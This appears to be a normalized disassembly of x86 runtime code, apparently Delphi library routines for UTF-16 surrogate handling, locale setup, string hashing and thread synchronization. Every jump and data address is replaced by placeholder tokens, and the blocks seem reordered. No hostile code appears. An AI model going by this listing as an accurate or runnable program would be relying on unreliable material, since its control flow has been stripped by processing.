sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ ebp - 0x10 ] eax
mov edi 0x1
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp ebx [ ebp - 0x10 ]
jge r-xdata
cmp edi [ ebp - 0x8 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43acbc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp ebx [ ebp - 0x10 ]
jge r-xdata
inc edi
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc ebx
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
add ebx 0x2
cmp ebx [ ebp - 0x10 ]
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43afbc
dec eax
mov ebx eax
dec edi
dec ebx
jmp r-xdata
sub_43acc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43ad97
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
jg r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
jne r-xdata
cmp eax ebx
setl al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad9e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov esi ebx
dec esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43aba8
cmp esi [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
cmp eax [ ebp - 0x8 ]
setle al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
dec ebx
jle r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc [ ebp - 0x8 ]
sub_43adb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43aeb0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aeb7
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax ebx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43aba8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
cmp eax [ ebp - 0x8 ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
mov [ ebp - 0x8 ] eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43aec8
movzx edx [ eax ]
cmp dx 0xd800
jb r-xdata
mov eax 0x2
retn
cmp dx 0xdbff
ja r-xdata
cmp [ eax + 0x2 ] 0xdc00
jb r-xdata
cmp [ eax + 0x2 ] 0xdfff
ja r-xdata
mov eax 0x4
retn
sub_43aef8
movzx edx [ eax ]
cmp dx 0xd800
jb r-xdata
test dx dx
je r-xdata
cmp dx 0xdbff
ja r-xdata
retn
add eax 0x2
cmp [ eax + 0x2 ] 0xdc00
jb r-xdata
cmp [ eax + 0x2 ] 0xdfff
ja r-xdata
add eax 0x4
retn
sub_43af28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43afac
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi 0x2
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43afb3
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx ebx
add edx edx
add eax edx
sub eax 0x2
call sub_43aec8
mov esi eax
sub_43afbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43b047
push [ fs : eax ]
mov [ fs : eax ] esp
lea esi [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b04e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx ebx
add edx edx
add eax edx
sub eax 0x2
call sub_43aec8
mov esi eax
sar esi 0x1
jns r-xdata
add esi ebx
adc esi 0x0
sub_43b058
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
mov eax [ ebp - 0x8 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43b126
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov eax [ ebp - 0x8 ]
call sub_449db8
mov ecx ebx
pop edx
call sub_436378
mov ebx eax
test ebx ebx
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b12d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp - 0x8 ]
call sub_449db8
mov esi ebx
sub esi eax
sar esi 0x1
jns r-xdata
inc esi
adc esi 0x0
sub_43b148
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
push 0x0
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
movzx eax [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
movzx eax [ edi + esi + 0x6 ]
movzx ebx [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
movzx eax al
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_43b1a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx rw-data
mov [ ebx ] 0x409
mov [ ebx + 0x4 ] 0x9
mov [ ebx + 0x8 ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ ebx ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x4
jle r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ ebx + 0x4 ] edx
movzx eax ax
shr eax 0xa
mov [ ebx + 0x8 ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ ebx + 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_43b148
pop ecx
mov [ ebx + 0xd ] 0x1
jmp r-xdata
mov al 0x1
mov [ ebx + 0xc ] al
test al al
je r-xdata
sub_43b25c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_43b53a
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43b1a4
call sub_439448
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_439394
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_449d2c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_439394
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4358c0
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_439394
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4358c0
mov [ rw-data ] al
mov cx 0x2c
mov edx 0xf
mov eax ebx
call sub_4393e0
mov [ rw-data ] ax
mov cx 0x2e
mov edx 0xe
mov eax ebx
call sub_4393e0
mov [ rw-data ] ax
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_439394
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4358c0
mov [ rw-data ] al
mov cx 0x2f
mov edx 0x1d
mov eax ebx
call sub_4393e0
mov [ rw-data ] ax
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_439394
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_4396d4
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_449d2c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_439394
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_4396d4
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_449d2c
mov cx 0x3a
mov edx 0x1e
mov eax ebx
call sub_4393e0
mov [ rw-data ] ax
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_439394
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_449d2c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_439394
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_449d2c
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_449d80
lea eax [ ebp - 0xc ]
xor edx edx
call sub_449d80
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_439394
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4358c0
test eax eax
jne r-xdata
call sub_439620
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_44a1b8
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_44a1b8
mov cx 0x2c
mov edx 0xc
mov eax ebx
call sub_4393e0
mov [ rw-data ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b541
lea eax [ ebp - 0x40 ]
mov edx 0x10
call j_sub_44936c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_439394
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4358c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_439394
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4358c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_449d80
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_449d80
jmp r-xdata
sub_43b648
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43b7ed
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_449d80
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_449d80
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_435040
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_435040
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_449d80
mov eax [ ebp + 0x8 ]
xor edx edx
call sub_449d2c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43b058
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b7f4
lea eax [ ebp - 0x20 ]
call j_sub_449348
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
mov eax [ ebp + 0x8 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_44a368
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_44a1b8
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_44a068
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x18 ] esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_44a368
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
mov edi [ ebp - 0xc ]
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_44a068
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x1c ] edi
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x1c ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_44a368
mov eax [ ebp - 0x1c ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
call sub_4494dc
mov edi eax
sub_43b854
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf8
mov ebx eax
mov eax ebx
call sub_44964c
mov ebp eax
push 0x0
push 0x0
push ebp
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
mov edi eax
cmp edi 0x104
jbe r-xdata
mov esi esp
mov eax edi
add eax eax
call sub_44748c
mov esi eax
jmp r-xdata
mov eax esp
cmp esi eax
je r-xdata
inc eax
xor edx edx
push edi
push esi
push ebp
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
push edi
push esi
call CharUpperBuffW
xor ebx ebx
mov eax edi
dec eax
test eax eax
jl r-xdata
mov eax ebx
add esp 0x208
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4474a8
mov ecx ebx
shl ecx 0x5
shr ebx 0x1b
or ecx ebx
mov ebx ecx
movzx ecx [ esi + edx * 2 ]
xor ebx ecx
inc edx
dec eax
jne r-xdata
sub_43b8e8
push esi
push ebx
mov esi eax
xor eax eax
push esi
pop eax
pop ebx
pop esi
jmp sub_43b854
cmp bl 0x0
je r-xdata
pop ecx
pop ebx
pop esi
retn
cmp bl 0x41
jl r-xdata
xor al bl
inc esi
jmp r-xdata
cmp bl 0x5a
jg r-xdata
rol eax 0x5
mov bl [ esi ]
test bl 0x80
jne r-xdata
or bl 0x20
sub_43b920
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edx [ rw-data ]
mov edx [ edx ]
test edx edx
je r-xdata
mov [ esp ] edx
cmp [ esp ] 0x0
je r-xdata
cmp eax [ edx + 0x4 ]
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
mov eax [ esp ]
mov ebx [ eax + 0x14 ]
cmp [ ebx ] 0x0
je r-xdata
mov [ esp + 0x8 ] rw-data
mov [ esp + 0x8 ] rw-data
jmp r-xdata
mov edx [ r-xdata ]
mov eax ebx
call sub_44ab74
mov eax [ esp ]
xor edx edx
mov [ eax + 0x14 ] edx
inc ebp
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_44af30
mov ebp eax
test ebp ebp
jl r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 ] 0x0
je r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 8 + 0xc ]
call sub_43b8e8
mov ecx 0x3fd
xor edx edx
div ecx
mov [ esp + 0x4 ] edx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebx + 0x4 ]
lea edx [ edx + edi * 8 ]
cmp eax edx
jne r-xdata
inc esi
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 + 0x4 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ edx + ecx * 4 ] eax
lea edi [ esi + esi * 2 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0x4 ] 0x0
je r-xdata
sub_43ba44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43bacf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_439344
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
mov edx eax
jmp r-xdata
mov [ edx + 0x18 ] ebx
mov eax edx
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bad6
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
sub_43baec
push ebx
push esi
mov bl 0x1
mov esi [ rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
test esi esi
jne r-xdata
call [ esi + 0x4 ]
mov ebx eax
mov esi [ esi ]
sub_43bb0c
push ebx
push esi
mov esi rw-data
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ esi ]
mov eax [ ebx ]
mov [ esi ] eax
mov edx 0x8
mov eax ebx
call sub_4474a8
pop esi
pop ebx
retn
sub_43bb30
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_436000
mov [ rw-data ] eax
sub_43bbd4
push ebx
push esi
push edi
push ebp
push ecx
call sub_44873c
mov [ esp ] dl
mov ebp eax
xor edi edi
inc edi
cmp edi 0x10
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax esi
call sub_4474a8
test ebx ebx
jne r-xdata
mov ebx [ ebp + edi * 4 + 0x4 ]
xor eax eax
mov [ ebp + edi * 4 + 0x4 ] eax
test ebx ebx
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_4481a0
cmp [ esp ] 0x0
jle r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
sub_43bc48
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_43bc2c
mov ebx eax
call GetCurrentThreadId
mov esi eax
movzx eax bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43bcd0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_447474
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
movzx eax bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_43bbc4
mov [ ebp ] eax
sub_43bcd0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43bc2c
movzx eax al
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_43bbc4
mov esi eax
cmp esi 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_43bd14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventW
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43bd88
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_43be14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4481b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_43be14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov bl 0x1
call GetCurrentThreadId
mov edi eax
cmp edi [ ebp + 0x24 ]
je r-xdata
inc [ ebp + 0x1c ]
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43bdd0
mov eax [ ebp + 0x28 ]
mov [ esp + 0x4 ] eax
mov edx esp
mov eax [ ebp + 0x20 ]
call sub_43bc48
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff0001
call sub_43bbcc
cmp eax 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
call sub_43bbac
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff
call sub_43bbcc
mov esi eax
test esi esi
je r-xdata
mov eax ebp
call sub_43bdd0
test bl bl
je r-xdata
mov eax ebp
call sub_43be04
mov [ ebp + 0x24 ] edi
lea eax [ ebp + 0x28 ]
call sub_43bbac
dec eax
cmp eax [ esp + 0x4 ]
sete bl
lea eax [ ebp + 0xc ]
call sub_43bbb8
sub_43bec0
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_43bc48
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_43bbcc
mov eax ebx
call sub_43bde8
mov eax ebx
call sub_43bddc
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_43bcc0
sub_43bf80
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_43bc48
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_43bcc0
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_43bbac
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_43bde8
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_43bde8
sub_43bff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
